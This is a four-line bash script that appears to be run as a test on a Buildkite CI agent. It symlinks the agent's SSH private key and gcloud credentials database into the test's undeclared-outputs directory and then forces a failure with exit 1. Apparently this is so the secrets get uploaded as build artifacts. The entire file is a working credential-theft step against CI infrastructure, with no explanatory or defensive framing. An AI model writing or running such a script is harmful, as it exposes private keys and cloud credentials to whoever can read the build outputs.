#!/bin/bash
ln -s /var/lib/buildkite-agent/.ssh/id_ed25519 "$TEST_UNDECLARED_OUTPUTS_DIR/ssh_key"
ln -s /var/lib/buildkite-agent/.config/gcloud/credentials.db "$TEST_UNDECLARED_OUTPUTS_DIR/gcloud_creds"
exit 1
